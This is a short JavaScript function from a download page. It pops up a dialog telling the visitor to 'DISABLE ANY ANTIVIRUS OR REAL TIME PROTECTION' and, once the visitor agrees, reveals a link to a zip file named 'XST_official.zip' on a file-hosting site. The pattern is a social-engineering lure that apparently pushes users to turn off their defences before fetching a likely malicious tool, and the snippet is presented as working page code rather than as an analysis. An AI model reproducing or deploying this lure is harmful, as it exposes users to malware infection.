function showDownloadLink() {
    var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
    
    if (confirmDownload) {
        document.getElementById('downloadLink').style.display = 'block';
        document.getElementById('downloadLink').innerHTML = 'Download tool now<a href="https://www.mediafire.com/file/w6342v3tgerxdba/XST_official.zip/file">here</a>.';
    }
}
